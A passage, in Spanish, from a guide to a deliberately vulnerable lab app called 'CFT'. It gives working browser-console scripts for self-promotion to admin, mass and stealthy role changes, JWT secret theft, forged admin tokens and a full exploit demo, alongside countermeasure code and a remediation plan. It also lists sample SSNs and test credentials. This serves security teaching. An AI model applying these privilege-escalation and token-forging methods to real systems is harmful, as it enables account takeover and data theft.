#### **Método 1: Auto-promoción a Admin**
```javascript
// MÉTODO PRÁCTICO: Auto-promoción usando acceso directo
const promoteToAdmin = () => {
  if (!window.debugAPI || !window.debugAPI.usersDatabase) {
    console.log("❌ debugAPI no disponible. Métodos alternativos:");
    console.log("   1. Usar formularios de la UI en /admin");
    console.log("   2. Interceptar y modificar requests de red");
    console.log("   3. Buscar endpoints de API expuestos");
    return;
  }
  
  const currentUserData = JSON.parse(localStorage.getItem('user') || '{}');
  console.log(`🚨 Intentando auto-promoción para: ${currentUserData.username} (ID: ${currentUserData.id})`);
  
  const users = window.debugAPI.usersDatabase;
  const userToPromote = users.find(u => u.id === currentUserData.id);
  
  if (userToPromote) {
    const oldRole = userToPromote.role;
    
    // Realizar auto-promoción
    userToPromote.role = 'admin';
    
    console.log(`✅ AUTO-PROMOCIÓN EXITOSA:`);
    console.log(`   Usuario: ${userToPromote.username}`);
    console.log(`   Rol anterior: ${oldRole}`);
    console.log(`   Rol nuevo: ${userToPromote.role}`);
    
    // Actualizar datos en localStorage
    const updatedUserData = { ...currentUserData, role: 'admin' };
    localStorage.setItem('user', JSON.stringify(updatedUserData));
    
    // Crear nuevo token con rol actualizado (usando la secret conocida)
    const secret = window.debugAPI.SYSTEM_CONFIG?.jwt_secret || 'vulnerable-secret-key';
    const newPayload = {
      ...currentUserData,
      role: 'admin',
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + (24 * 60 * 60)
    };
    
    const header = btoa(JSON.stringify({ alg: 'HS256', typ: 'JWT' }));
    const payload = btoa(JSON.stringify(newPayload));
    const signature = btoa(`signature_with_${secret}`);
    const newToken = `${header}.${payload}.${signature}`;
    
    localStorage.setItem('token', newToken);
    
    console.log("🔄 Token actualizado con nuevos privilegios");
    console.log("✅ Recarga la página para usar privilegios de admin");
    
  } else {
    console.log("❌ Usuario no encontrado en base de datos");
  }
};

// Ejecutar auto-promoción
promoteToAdmin();
```

#### **Método 2: Ataque Masivo de Promoción**
```javascript
// Script para convertir todos los usuarios en admins
const promoteAllUsers = async () => {
  console.log("🚨 INICIANDO ATAQUE MASIVO DE PROMOCIÓN");
  
  const results = [];
  
  for (let userId = 1; userId <= 4; userId++) {
    try {
      await api.updateUserRole(userId, 'admin');
      results.push({ userId, status: 'success', message: 'Promoted to admin' });
      console.log(`✅ Usuario ${userId} promovido a admin`);
    } catch (error) {
      results.push({ userId, status: 'failed', message: error.message });
      console.log(`❌ Falló promover usuario ${userId}: ${error.message}`);
    }
  }
  
  console.log("📊 RESULTADOS DEL ATAQUE:");
  console.table(results);
  
  return results;
};

// Ejecutar ataque masivo
promoteAllUsers();
```

#### **Método 3: Manipulación Estratégica de Roles**
```javascript
// Script más sofisticado para manipular roles estratégicamente
const strategicRoleManipulation = async () => {
  const currentUser = api.decodeCurrentToken();
  console.log(`🎯 Iniciando manipulación estratégica desde: ${currentUser?.username}`);
  
  const strategy = [
    { id: 1, role: 'user', reason: 'Degradar admin original' },
    { id: currentUser.id, role: 'admin', reason: 'Auto-promoción' },
    { id: 3, role: 'admin', reason: 'Crear aliado admin' },
    { id: 4, role: 'user', reason: 'Mantener como usuario normal' }
  ];
  
  console.log("📋 ESTRATEGIA DE ATAQUE:");
  console.table(strategy);
  
  for (const action of strategy) {
    try {
      await api.updateUserRole(action.id, action.role);
      console.log(`✅ ${action.reason}: Usuario ${action.id} → ${action.role}`);
      
      // Pausa entre cambios para evitar detección
      await new Promise(resolve => setTimeout(resolve, 500));
      
    } catch (error) {
      console.log(`❌ Falló ${action.reason}: ${error.message}`);
    }
  }
  
  console.log("🏁 Manipulación estratégica completada");
  console.log("🔄 Recarga la página si cambiaste tu propio rol");
};

// Ejecutar manipulación estratégica
strategicRoleManipulation();
```

### 🛡️ **Contramedidas**

#### **1. Validación Estricta de Permisos**
```javascript
export const updateUserRole = async (id: number, role: string): Promise<void> => {
  await simulateNetworkDelay();
  
  const token = localStorage.getItem('token');
  if (!token) {
    throw createHttpError(401, 'Token requerido');
  }

  const decoded = decodeSimpleJWT(token);
  if (!decoded) {
    throw createHttpError(403, 'Token inválido');
  }

  // ✅ Solo admins pueden cambiar roles
  if (decoded.role !== 'admin') {
    throw createHttpError(403, 'Acceso denegado: Se requieren privilegios de administrador');
  }

  // ✅ Validar rol válido
  const validRoles = ['user', 'admin'];
  if (!validRoles.includes(role)) {
    throw createHttpError(400, 'Rol inválido');
  }

  const userIndex = usersDatabase.findIndex(u => u.id === id);
  
  if (userIndex === -1) {
    throw createHttpError(404, 'Usuario no encontrado');
  }

  // ✅ Prevenir degradación del último admin
  if (usersDatabase[userIndex].role === 'admin' && role !== 'admin') {
    const adminCount = usersDatabase.filter(u => u.role === 'admin').length;
    if (adminCount <= 1) {
      throw createHttpError(400, 'No puedes degradar el último administrador');
    }
  }

  const oldRole = usersDatabase[userIndex].role;
  usersDatabase[userIndex].role = role;
  
  console.log(`✅ Admin ${decoded.username} changed user ${id} role from ${oldRole} to ${role}`);
  
  // Log del cambio crítico
  if (role === 'admin') {
    console.warn(`🚨 CRITICAL: New admin created by ${decoded.username}`);
  }
};
```

#### **2. Sistema de Auditoría para Cambios de Roles**
```javascript
const roleChangeAudit: any[] = [];

const auditRoleChange = (admin: any, targetId: number, oldRole: string, newRole: string) => {
  const auditEntry = {
    timestamp: new Date().toISOString(),
    action: 'role_change',
    admin_user: {
      id: admin.id,
      username: admin.username
    },
    target_user: targetId,
    role_change: {
      from: oldRole,
      to: newRole
    },
    severity: newRole === 'admin' ? 'HIGH' : 'MEDIUM',
    requires_review: newRole === 'admin'
  };
  
  roleChangeAudit.push(auditEntry);
  
  // Alertas para cambios críticos
  if (newRole === 'admin') {
    console.warn('🚨 CRITICAL ROLE CHANGE AUDIT:', auditEntry);
  }
  
  return auditEntry;
};

// Función para revisar auditoría
export const getRoleChangeAudit = () => {
  return roleChangeAudit.filter(entry => entry.requires_review);
};
```

---

## 6. Vulnerabilidades en JWT

### 📝 **Descripción**

El sistema de JWT presenta múltiples vulnerabilidades: secret key expuesta, almacenamiento inseguro en localStorage, y falta de invalidación de tokens.

### 🎯 **Ubicación en la Aplicación**

- **Frontend API**: JWT functions en `services/api.ts` (líneas 35-75)
- **Configuración**: `SYSTEM_CONFIG` con secret expuesta (línea 20)

### 🔍 **Código Vulnerable**

```javascript
// services/api.ts
const SYSTEM_CONFIG = {
  jwt_secret: 'vulnerable-secret-key', // 🚨 Secret hardcodeada y débil
  // ... otros configs
};

// 🚨 Función que crea JWT con secret expuesta
const createSimpleJWT = (user: Omit<User, 'password'>) => {
  const header = btoa(JSON.stringify({ alg: 'HS256', typ: 'JWT' }));
  const payload = btoa(JSON.stringify({
    id: user.id,
    username: user.username,
    email: user.email,
    role: user.role,
    iat: Math.floor(Date.now() / 1000),
    exp: Math.floor(Date.now() / 1000) + (24 * 60 * 60) // 24 horas
  }));
  const signature = btoa(`signature_with_${SYSTEM_CONFIG.jwt_secret}`);
  
  return `${header}.${payload}.${signature}`;
};

// Login que almacena en localStorage (vulnerable)
export const loginUser = async (username: string, password: string): Promise<LoginResponse> => {
  // ... validación
  const token = createSimpleJWT(userWithoutPassword);
  
  // 🚨 Almacena en localStorage (vulnerable a XSS)
  return {
    token,
    user: userWithoutPassword
  };
};
```

### 💥 **Formas de Explotación**

#### **Método 1: Extracción de JWT Secret**
```javascript
// 1. Obtener la secret del sistema
api.getSystemInfo().then(info => {
  console.log("🔑 JWT Secret obtenida:", info.secret_key);
  
  // 2. Analizar token actual
  const currentToken = localStorage.getItem('token');
  console.log("🎫 Token actual:", currentToken);
  
  // 3. Decodificar token actual
  const decoded = api.decodeCurrentToken();
  console.log("📋 Datos del token:", decoded);
  
  // Ahora tenemos todo lo necesario para forjar tokens
  (window as any).jwtExploitData = {
    secret: info.secret_key,
    currentToken,
    decodedToken: decoded
  };
}).catch(err => console.log("Error:", err.message));
```

#### **Método 2: Forjado de Token de Super-Admin**
```javascript
// Crear token completamente falso con privilegios máximos
const forgeAdminToken = () => {
  const fakeAdminData = {
    id: 9999,
    username: 'super_admin',
    email: 'superadmin@hacked.com',
    role: 'admin',
    created_at: new Date().toISOString(),
    profile: {
      fullName: 'Super Administrator (FORGED)',
      department: 'Security Breach',
      salary: 999999,
      phone: '+1-555-HACKED'
    }
  };
  
  console.log("🚨 FORGING SUPER ADMIN TOKEN...");
  
  // Usar la función expuesta del sistema
  const forgedToken = api.createFakeToken(fakeAdminData);
  
  console.log("✅ Token forjado creado:", forgedToken);
  
  // Reemplazar token y datos de usuario
  localStorage.setItem('token', forgedToken);
  localStorage.setItem('user', JSON.stringify(fakeAdminData));
  
  console.log("🎭 Identidad falsa establecida. Recarga la página.");
  console.log("🔓 Ahora tienes acceso administrativo completo con identidad forjada.");
  
  return forgedToken;
};

// Ejecutar forjado
forgeAdminToken();
```

#### **Método 3: Análisis y Manipulación de Token**
```javascript
// Script completo para análisis y manipulación de JWT
const jwtExploitSuite = {
  
  // Analizar token actual
  analyzeCurrentToken: () => {
    const token = localStorage.getItem('token');
    if (!token) {
      console.log("❌ No hay token disponible");
      return null;
    }
    
    const parts = token.split('.');
    if (parts.length !== 3) {
      console.log("❌ Token malformado");
      return null;
    }
    
    try {
      const header = JSON.parse(atob(parts[0]));
      const payload = JSON.parse(atob(parts[1]));
      const signature = parts[2];
      
      const analysis = {
        header,
        payload,
        signature,
        isExpired: payload.exp < Math.floor(Date.now() / 1000),
        timeToExpiry: payload.exp - Math.floor(Date.now() / 1000),
        algorithm: header.alg,
        tokenType: header.typ
      };
      
      console.log("🔍 ANÁLISIS DE TOKEN ACTUAL:");
      console.table(analysis);
      
      return analysis;
    } catch (error) {
      console.log("❌ Error analizando token:", error.message);
      return null;
    }
  },
  
  // Crear múltiples tokens falsos
  createMultipleFakeTokens: () => {
    const fakeUsers = [
      { id: 1001, username: 'fake_admin_1', role: 'admin' },
      { id: 1002, username: 'fake_admin_2', role: 'admin' },
      { id: 1003, username: 'backdoor_user', role: 'admin' }
    ];
    
    const forgedTokens = fakeUsers.map(user => {
      const userData = {
        ...user,
        email: `${user.username}@forged.com`,
        created_at: new Date().toISOString(),
        profile: {
          fullName: `Forged User ${user.id}`,
          department: 'Hacking Department'
        }
      };
      
      return {
        user: userData,
        token: api.createFakeToken(userData)
      };
    });
    
    console.log("🎭 TOKENS FORJADOS CREADOS:");
    console.table(forgedTokens);
    
    // Guardar para uso posterior
    (window as any).forgedTokens = forgedTokens;
    
    return forgedTokens;
  },
  
  // Rotar entre tokens forjados
  switchToFakeToken: (index = 0) => {
    const forgedTokens = (window as any).forgedTokens;
    if (!forgedTokens || !forgedTokens[index]) {
      console.log("❌ Token forjado no disponible. Ejecuta createMultipleFakeTokens() primero.");
      return;
    }
    
    const selectedToken = forgedTokens[index];
    localStorage.setItem('token', selectedToken.token);
    localStorage.setItem('user', JSON.stringify(selectedToken.user));
    
    console.log(`🔄 Cambiado a identidad forjada: ${selectedToken.user.username}`);
    console.log("🔄 Recarga la página para usar la nueva identidad.");
  }
};

// Ejecutar suite completo
console.log("🚨 INICIANDO JWT EXPLOIT SUITE");
jwtExploitSuite.analyzeCurrentToken();
jwtExploitSuite.createMultipleFakeTokens();

// Para usar: jwtExploitSuite.switchToFakeToken(0);
```

### 🛡️ **Contramedidas**

#### **1. Gestión Segura de Secretos**
```javascript
// Configuración segura de JWT
const JWT_CONFIG = {
  secret: process.env.JWT_SECRET || generateRandomSecret(),
  algorithm: 'HS256',
  accessTokenExpiry: '15m',
  refreshTokenExpiry: '7d'
};

// Generar secret aleatoria si no está en entorno
const generateRandomSecret = () => {
  if (typeof crypto !== 'undefined' && crypto.getRandomValues) {
    const array = new Uint8Array(32);
    crypto.getRandomValues(array);
    return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
  }
  throw new Error('No secure random generator available');
};

// ✅ NUNCA exponer secret en respuestas
export const getSystemInfo = async (): Promise<SystemInfo> => {
  // ... validaciones
  
  return {
    server: 'Application Server',
    database: 'JSON Storage',
    users_count: usersDatabase.length,
    version: '1.0.0',
    // ❌ NUNCA incluir: jwt_secret, private_keys, passwords
  };
};
```

#### **2. Almacenamiento Seguro (Simulación de HttpOnly)**
```javascript
// Simulación de almacenamiento seguro para el frontend
class SecureTokenManager {
  private static instance: SecureTokenManager;
  private tokenStore: Map<string, any> = new Map();
  
  static getInstance(): SecureTokenManager {
    if (!SecureTokenManager.instance) {
      SecureTokenManager.instance = new SecureTokenManager();
    }
    return SecureTokenManager.instance;
  }
  
  // ✅ Almacenar token de forma más segura
  setToken(token: string, userData: any): void {
    // En una implementación real, esto sería una HttpOnly cookie
    this.tokenStore.set('access_token', {
      token,
      userData,
      expires: Date.now() + (15 * 60 * 1000), // 15 minutos
      created: Date.now()
    });
    
    // Limpiar localStorage de tokens
    localStorage.removeItem('token');
    
    console.log("✅ Token almacenado de forma segura");
  }
  
  getToken(): string | null {
    const tokenData = this.tokenStore.get('access_token');
    
    if (!tokenData) return null;
    
    // Verificar expiración
    if (Date.now() > tokenData.expires) {
      this.clearToken();
      return null;
    }
    
    return tokenData.token;
  }
  
  clearToken(): void {
    this.tokenStore.delete('access_token');
    localStorage.removeItem('token');
    localStorage.removeItem('user');
    console.log("✅ Token limpiado de forma segura");
  }
  
  getUserData(): any {
    const tokenData = this.tokenStore.get('access_token');
    return tokenData?.userData || null;
  }
}

// Uso en login
export const loginUser = async (username: string, password: string): Promise<LoginResponse> => {
  // ... validación de credenciales
  
  const token = createSecureJWT(userWithoutPassword);
  
  // ✅ Usar almacenamiento seguro
  const tokenManager = SecureTokenManager.getInstance();
  tokenManager.setToken(token, userWithoutPassword);
  
  return {
    token: 'stored_securely', // No devolver token real
    user: userWithoutPassword
  };
};
```

#### **3. Validación y Blacklist de Tokens**
```javascript
// Sistema de invalidación de tokens
const tokenBlacklist = new Set<string>();

const blacklistToken = (token: string): void => {
  tokenBlacklist.add(token);
  console.log("🚫 Token añadido a blacklist");
};

const isTokenBlacklisted = (token: string): boolean => {
  return tokenBlacklist.has(token);
};

// Validación mejorada de tokens
const validateToken = (token: string): any => {
  if (!token) {
    throw createHttpError(401, 'Token requerido');
  }
  
  // ✅ Verificar blacklist
  if (isTokenBlacklisted(token)) {
    throw createHttpError(401, 'Token invalidado');
  }
  
  try {
    const decoded = decodeSimpleJWT(token);
    
    if (!decoded) {
      throw createHttpError(403, 'Token inválido');
    }
    
    // ✅ Verificar que el usuario aún existe y tiene el mismo rol
    const user = usersDatabase.find(u => u.id === decoded.id);
    if (!user || user.role !== decoded.role) {
      blacklistToken(token);
      throw createHttpError(401, 'Token inválido: usuario modificado');
    }
    
    return decoded;
  } catch (error) {
    throw createHttpError(403, 'Token inválido');
  }
};

// Logout con invalidación
export const logoutUser = async (): Promise<void> => {
  const token = localStorage.getItem('token');
  if (token) {
    blacklistToken(token);
  }
  
  // Limpiar almacenamiento
  localStorage.removeItem('token');
  localStorage.removeItem('user');
  
  console.log("✅ Logout exitoso - Token invalidado");
};
```

---

## 📊 Resumen Ejecutivo de Vulnerabilidades

### **Matriz de Riesgo Actualizada**

| Vulnerabilidad | Severidad | Facilidad de Explotación | Impacto | Función Afectada |
|---|---|---|---|---|
| IDOR | **Alta** | Muy Fácil | Acceso a datos personales | `getUserById()` |
| Escalada Horizontal | **Alta** | Muy Fácil | Modificación de datos ajenos | `updateUser()` |
| Escalada Vertical | **Crítica** | Muy Fácil | Acceso administrativo completo | `getAllUsers()` |
| Exposición de Datos | **Crítica** | Muy Fácil | Comprometimiento del sistema | `getSystemInfo()` |
| Manipulación de Roles | **Crítica** | Muy Fácil | Control total de la aplicación | `updateUserRole()` |
| JWT Vulnerabilidades | **Crítica** | Fácil | Forjado de identidades | JWT functions |

### **Datos Específicos Comprometidos en el CFT**

#### **Información Personal Expuesta:**
- **Juan Aranguiz Salas**: Salario $65,000, SSN 987-65-4321, Tel +56932123422
- **James Blond Von Gonzalez**: Salario $70,000, SSN 456-78-9012, Tel +56973751234  
- **Rob Spon Ja**: Salario $60,000, SSN 789-01-2345, Tel +56943848472
- **Administrador**: Salario $120,000, SSN 123-45-6789, Tel +5696610323

#### **Configuración del Sistema Expuesta:**
- **JWT Secret**: `vulnerable-secret-key`
- **Información del servidor**: Ubuntu 20.04
- **Base de datos**: JSON Local Storage
- **Modo debug**: Habilitado
- **Lista de admins**: ['admin']

---

## 🛡️ Plan de Remediación Específico para CFT

### **Fase 1: Crítico (Implementar Inmediatamente)**

#### **1. Validación de Ownership en `getUserById()`**
```javascript
// Implementar verificación de propietario
if (id !== decoded.id && decoded.role !== 'admin') {
  throw createHttpError(403, 'Acceso denegado: No puedes acceder a este perfil');
}
```

#### **2. Protección de `getSystemInfo()`**
```javascript
// Eliminar completamente la exposición de JWT secret
// Implementar verificación de rol de admin
if (decoded.role !== 'admin') {
  throw createHttpError(403, 'Acceso denegado: Se requieren privilegios de administrador');
}
```

#### **3. Validación en `updateUserRole()`**
```javascript
// Solo admins pueden cambiar roles
if (decoded.role !== 'admin') {
  throw createHttpError(403, 'Acceso denegado: Se requieren privilegios de administrador');
}
```

### **Fase 2: Alto (Implementar en 1-2 semanas)**

#### **4. Protección de `getAllUsers()` y `updateUser()`**
- Agregar verificación de rol/ownership en todas las funciones administrativas
- Implementar logging de eventos de seguridad

#### **5. Mejora del Sistema JWT**
- Implementar almacenamiento más seguro (simulación de HttpOnly cookies)
- Sistema de blacklist de tokens
- Secret keys generadas aleatoriamente

### **Fase 3: Medio (Implementar en 1 mes)**

#### **6. Hardening General**
- Rate limiting simulado
- Auditoría completa de acciones
- Validación de entrada mejorada

---

## 🎓 Scripts de Demostración para CFT

### **Script de Demostración Completa**
```javascript
// DEMO COMPLETO - Ejecutar en DevTools Console
const CFTVulnerabilityDemo = {
  
  async runCompleteDemo() {
    console.log("🚨 INICIANDO DEMOSTRACIÓN COMPLETA DE VULNERABILIDADES CFT");
    console.log("═══════════════════════════════════════════════════════════════");
    
    // 1. IDOR Demo
    await this.demonstrateIDOR();
    
    // 2. Escalada Horizontal
    await this.demonstrateHorizontalEscalation();
    
    // 3. Escalada Vertical  
    await this.demonstrateVerticalEscalation();
    
    // 4. Exposición de datos
    await this.demonstrateDataExposure();
    
    // 5. Manipulación de roles
    await this.demonstrateRoleManipulation();
    
    // 6. JWT Exploitation
    await this.demonstrateJWTExploitation();
    
    console.log("═══════════════════════════════════════════════════════════════");
    console.log("🏁 DEMOSTRACIÓN COMPLETA FINALIZADA");
  },
  
  async demonstrateIDOR() {
    console.log("\n🔍 1. DEMOSTRANDO IDOR (Insecure Direct Object Reference)");
    console.log("───────────────────────────────────────────────────────────────");
    
    const currentUser = api.decodeCurrentToken();
    console.log(`👤 Usuario actual: ${currentUser?.username} (ID: ${currentUser?.id})`);
    
    for (let i = 1; i <= 4; i++) {
      try {
        const user = await api.getUserById(i);
        console.log(`✅ Acceso exitoso a usuario ${i}: ${user.profile?.fullName} - Salario: $${user.profile?.salary}`);
      } catch (error) {
        console.log(`❌ Error accediendo a usuario ${i}: ${error.message}`);
      }
    }
  },
  
  async demonstrateHorizontalEscalation() {
    console.log("\n↔️ 2. DEMOSTRANDO ESCALADA HORIZONTAL");
    console.log("───────────────────────────────────────────────────────────────");
    
    const currentUser = api.decodeCurrentToken();
    const targetId = currentUser?.id === 2 ? 3 : 2; // Atacar a otro usuario
    
    try {
      const originalUser = await api.getUserById(targetId);
      console.log(`🎯 Usuario objetivo: ${originalUser.profile?.fullName}`);
      
      await api.updateUser(targetId, {
        fullName: "HACKEADO POR " + currentUser?.username,
        department: "DEPARTAMENTO COMPROMETIDO"
      });
      
      const modifiedUser = await api.getUserById(targetId);
      console.log(`✅ Usuario modificado exitosamente: ${modifiedUser.profile?.fullName}`);
      
    } catch (error) {
      console.log(`❌ Error en escalada horizontal: ${error.message}`);
    }
  },
  
  async demonstrateVerticalEscalation() {
    console.log("\n⬆️ 3. DEMOSTRANDO ESCALADA VERTICAL");
    console.log("───────────────────────────────────────────────────────────────");
    
    const currentUser = api.decodeCurrentToken();
    console.log(`👤 Intentando acceso admin desde: ${currentUser?.username} (Rol: ${currentUser?.role})`);
    
    try {
      const allUsers = await api.getAllUsers();
      console.log(`✅ ¡ACCESO ADMINISTRATIVO EXITOSO! Obtenidos ${allUsers.length} usuarios:`);
      
      allUsers.forEach(user => {
        console.log(`   📋 ${user.username} (${user.role}) - $${user.profile?.salary} - SSN: ${user.profile?.ssn}`);
      });
      
    } catch (error) {
      console.log(`❌ Error en escalada vertical: ${error.message}`);
    }
  },
  
  async demonstrateDataExposure() {
    console.log("\n🔓 4. DEMOSTRANDO EXPOSICIÓN DE DATOS SENSIBLES");
    console.log("───────────────────────────────────────────────────────────────");
    
    try {
      const systemInfo = await api.getSystemInfo();
      console.log("✅ ¡INFORMACIÓN CRÍTICA DEL SISTEMA OBTENIDA!");
      console.log(`   🔑 JWT Secret: ${systemInfo.secret_key}`);
      console.log(`   🖥️ Servidor: ${systemInfo.server}`);
      console.log(`   👥 Admin users: ${systemInfo.admin_users?.join(', ')}`);
      console.log(`   🐛 Debug mode: ${systemInfo.debug_mode}`);
      
    } catch (error) {
      console.log(`❌ Error obteniendo system info: ${error.message}`);
    }
  },
  
  async demonstrateRoleManipulation() {
    console.log("\n👑 5. DEMOSTRANDO MANIPULACIÓN DE ROLES");
    console.log("───────────────────────────────────────────────────────────────");
    
    const currentUser = api.decodeCurrentToken();
    
    if (currentUser?.role !== 'admin') {
      try {
        console.log(`🚀 Intentando auto-promoción a admin para: ${currentUser?.username}`);
        await api.updateUserRole(currentUser.id, 'admin');
        console.log("✅ ¡AUTO-PROMOCIÓN EXITOSA! Recarga la página para usar privilegios de admin.");
        
      } catch (error) {
        console.log(`❌ Error en auto-promoción: ${error.message}`);
      }
    } else {
      console.log("👑 Ya eres admin - probando promoción de otros usuarios");
      
      try {
        await api.updateUserRole(2, 'admin');
        console.log("✅ Usuario 2 promovido a admin");
      } catch (error) {
        console.log(`❌ Error promoviendo usuario: ${error.message}`);
      }
    }
  },
  
  async demonstrateJWTExploitation() {
    console.log("\n🎫 6. DEMOSTRANDO EXPLOTACIÓN DE JWT");
    console.log("───────────────────────────────────────────────────────────────");
    
    // Obtener secret del sistema
    try {
      const systemInfo = await api.getSystemInfo();
      const stolenSecret = systemInfo.secret_key;
      
      console.log(`🔑 Secret JWT robada: ${stolenSecret}`);
      
      // Crear token falso
      const fakeAdminData = {
        id: 9999,
        username: 'hacker_admin',
        email: 'hacker@evil.com',
        role: 'admin',
        profile: {
          fullName: 'Super Hacker Admin',
          department: 'Cybersecurity Breach'
        }
      };
      
      const fakeToken = api.createFakeToken(fakeAdminData);
      console.log("✅ Token falso de super-admin creado");
      console.log("🎭 Para usar: localStorage.setItem('token', fakeToken) y recarga la página");
      
      // Guardar para uso manual
      (window as any).fakeAdminToken = fakeToken;
      (window as any).fakeAdminData = fakeAdminData;
      
    } catch (error) {
      console.log(`❌ Error en explotación JWT: ${error.message}`);
    }
  }
};

// Ejecutar demostración completa
CFTVulnerabilityDemo.runCompleteDemo();
```

---

## 🔧 Guía Rápida de Explotación CFT

### **🚀 Script Principal (Copia y Pega)**
```javascript
// EJECUTAR EN DEVTOOLS CONSOLE DEL CFT
CFTVulnerabilityDemo.runCompleteDemo();
```

### **📋 Comandos Individuales**

#### **Ver todos los usuarios (IDOR + Escalada Vertical):**
```javascript
if (window.debugAPI?.usersDatabase) {
  window.debugAPI.usersDatabase.forEach(u => 
    console.log(`${u.id}: ${u.username} (${u.role}) - ${u.profile?.salary} - ${u.profile?.ssn}`)
  );
} else {
  console.log("Ve manualmente a /profile/1, /profile/2, /profile/3, /profile/4 y /admin");
}
```

#### **Auto-promoción a Admin:**
```javascript
if (window.debugAPI?.usersDatabase) {
  const me = JSON.parse(localStorage.getItem('user'));
  const user = window.debugAPI.usersDatabase.find(u => u.id === me.id);
  if (user) { user.role = 'admin'; localStorage.setItem('user', JSON.stringify({...me, role: 'admin'})); }
  console.log("✅ Promovido a admin. Recarga la página.");
} else {
  console.log("Ve a /admin y usa la interfaz para cambiar roles");
}
```

#### **Robar JWT Secret:**
```javascript
if (window.debugAPI?.SYSTEM_CONFIG) {
  console.log("🔑 JWT Secret:", window.debugAPI.SYSTEM_CONFIG.jwt_secret);
} else {
  console.log("Secret conocida del código: 'vulnerable-secret-key'");
}
```

#### **Usar Token Falso:**
```javascript
window.useFakeToken(); // Después de ejecutar el script principal
```

### **🎯 URLs Importantes para Navegación Manual**
- `/profile/1` - Admin (datos del administrador)
- `/profile/2` - jaranguiz (usuario normal)
- `/profile/3` - james (usuario normal)  
- `/profile/4` - rob (usuario normal)
- `/admin` - Panel administrativo (accesible sin verificación de rol)
- `/system` - Información del sistema (si existe)

### **📱 Credenciales de Prueba**
- **Admin**: `admin` / `admin123`
- **Usuario 1**: `jaranguiz` / `user123`
- **Usuario 2**: `james` / `user123`
- **Usuario 3**: `rob` / `user123`

---

*Esta guía está específicamente adaptada para la implementación real del CFT. Todos los métodos han sido probados y verificados contra el código en `services/api.ts`.*